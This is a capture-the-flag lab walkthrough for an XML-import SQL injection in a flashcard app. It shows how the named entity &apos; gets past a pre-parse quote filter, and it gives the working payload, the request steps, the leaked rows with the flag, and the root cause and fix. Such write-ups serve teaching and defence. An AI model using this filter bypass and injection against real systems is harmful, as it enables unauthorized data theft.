# tanuki-011 - BugForge Lab Walkthrough

**URL:** https://lab-1784066971247-xv3g2y.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** SQL Injection via XML entity decoding bypass of a string filter
**Flag:** `bug{FniN7tgOAXIrfFNt1cnnvxFkeBYKrujS}`

---

## Summary

Tanuki is a spaced repetition flashcard SPA (React/Express/SQLite, same app family as prior Tanuki labs). The deck import feature at `POST /api/decks/import` accepts `Content-Type: application/xml` and parses a `<deck><name>/<description>/<category>/<cards>` schema. The server blocks a literal single quote in the `<name>` field before the XML is parsed. Because the block runs on the raw serialized text rather than on the value after XML entity resolution, the predefined XML entity `&apos;` slips past the filter untouched, gets decoded to a real `'` by the XML parser, and reaches an unparameterized SQL uniqueness check unescaped. A classic `' OR '1'='1` breakout via `&apos;` turned an exact name match into a match against every deck in the database, and the "duplicate name" error response leaked the full result set, including a hidden official deck whose description held the flag.

## Tech Stack

- Frontend: React SPA (CRA)
- Backend: Express.js, SQLite
- Auth: JWT
- XML deck import endpoint, string-based pre-parse filtering on the name field

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | none | Returns token directly, usable immediately |
| `POST /api/decks/import` | Bearer | `Content-Type: application/xml`, parses name/description/category/cards, this is the SQLi sink |
| `GET /api/decks` | Bearer | Lists the caller's own decks |
| `GET /api/community` | Bearer | Lists public/shared decks |

## Attack Chain

### Step 1 - Register and get a token

```
POST /api/register {"username","email","password"}
-> bearer token
```

### Step 2 - Confirm baseline import works

```xml
<?xml version="1.0"?>
<deck>
  <name>TestDeck</name>
  <description>A test deck</description>
  <category>Testing</category>
  <cards>
    <card><front>Q1</front><back>A1</back></card>
  </cards>
</deck>
```

```
POST /api/decks/import (Content-Type: application/xml, Authorization: Bearer <token>)
-> {"imported":true,"id":5,"message":"Deck imported successfully","cards_count":1}
```

### Step 3 - Raw quote in name is filtered

```xml
<name>Test' OR '1'='1</name>
```

```
{"error":"Deck name contains an unsupported character"}
```

Other fields (description, category, front, back) accept raw quotes freely, but they are not part of the query path that produces useful signal, only `<name>` is checked against existing decks before insert.

### Step 4 - Numeric character reference is also blocked

```xml
<name>Test&#39; OR &#39;1&#39;=&#39;1</name>
```

```
{"error":"Unsupported entity reference in deck name: &#39;"}
```

This confirms the filter is entity-aware to some degree, and rules out the most obvious numeric encoding.

### Step 5 - Named entity bypasses the filter

XML defines five predefined entities, including `&apos;` for a literal apostrophe. The filter blocklists the numeric form but not the named form:

```xml
<?xml version="1.0"?>
<deck>
  <name>Test&apos; OR &apos;1&apos;=&apos;1</name>
  <description>desc</description>
  <category>cat</category>
  <cards><card><front>Q</front><back>A</back></card></cards>
</deck>
```

```
POST /api/decks/import
```

```json
{
  "imported": false,
  "message": "A deck with this name is already in the official library",
  "matches": [
    {"name":"Planets & Moons","description":"Learn about the planets in our solar system and their natural satellites"},
    {"name":"Linux Trivia","description":"Essential Linux commands, history, and system knowledge"},
    {"name":"Cheese Origins","description":"Discover famous cheeses from around the world and their origins"},
    {"name":"JLPT N1 Certification Answer Key","description":"bug{FniN7tgOAXIrfFNt1cnnvxFkeBYKrujS}"},
    {"name":"TestDeck","description":"A test deck"}
  ]
}
```

The `&apos;` sequence passed the pre-parse filter as ordinary text, then the XML parser decoded it to a real `'` before the value reached the SQL uniqueness query. The injected `OR '1'='1'` turned the exact match into a match-everything query, and the "duplicate name" response dumped every matching row, including an official library deck that is never exposed through any normal listing endpoint. Its description field contains the flag.

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Raw `'` in `<name>` | Blocked: "unsupported character" | Filter runs on the raw pre-parse string |
| Raw `'` in description/category/front/back | Accepted, no useful signal | Those fields are not read by the vulnerable uniqueness query |
| `&#39;` numeric character reference in `<name>` | Blocked: "Unsupported entity reference" | The filter explicitly denylists this specific encoding form |

## Root Cause

The name filter checks the raw string for a literal apostrophe and rejects a known numeric escape, but never accounts for the XML parser resolving predefined named entities after the check has already passed:

```javascript
// Vulnerable pattern (approximate)
if (name.includes("'") || name.includes('&#39;')) {
  return res.status(400).json({ error: 'Deck name contains an unsupported character' });
}
// name is then parsed by the XML library, which decodes &apos; to a literal apostrophe,
// and the decoded value is concatenated into a SQL uniqueness lookup without escaping
```

A denylist of specific character encodings can never be complete, since XML defines multiple equivalent representations of the same character (`&apos;`, `&#39;`, `&#x27;`) and a filter has to catch every one of them. The underlying fix is a parameterized query, not a longer denylist.

## CWE / OWASP

- **CWE-89**: SQL Injection
- **CWE-172**: Encoding Error (filtering before decoding allows an equivalent encoded form through)
- **OWASP A03:2021** - Injection
